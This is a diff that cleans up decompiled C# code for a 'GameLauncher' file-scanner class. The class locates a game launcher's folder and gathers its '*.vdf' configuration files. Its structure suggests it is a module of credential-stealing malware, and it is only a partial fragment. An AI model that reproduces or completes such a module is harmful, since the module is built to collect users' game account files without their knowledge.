@@ -1,12 +1,10 @@
-﻿using System;
+// GameLauncher
 using System.Collections.Generic;
 using System.IO;
 using Microsoft.Win32;
 
-// Token: 0x02000026 RID: 38
 public class GameLauncher : FileScanner
 {
-	// Token: 0x060000CC RID: 204 RVA: 0x00008C64 File Offset: 0x00006E64
 	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
 	{
 		try
@@ -22,7 +20,6 @@ public class GameLauncher : FileScanner
 		return string.Empty;
 	}
 
-	// Token: 0x060000CD RID: 205 RVA: 0x00008CB4 File Offset: 0x00006EB4
 	public override IEnumerable<FileScannerArg> GetScanArgs()
 	{
 		List<FileScannerArg> list = new List<FileScannerArg>();
@@ -50,10 +47,11 @@ public class GameLauncher : FileScanner
 				Pattern = "*.vdf",
 				Recoursive = false
 			});
+			return list;
 		}
 		catch
 		{
+			return list;
 		}
-		return list;
 	}
 }
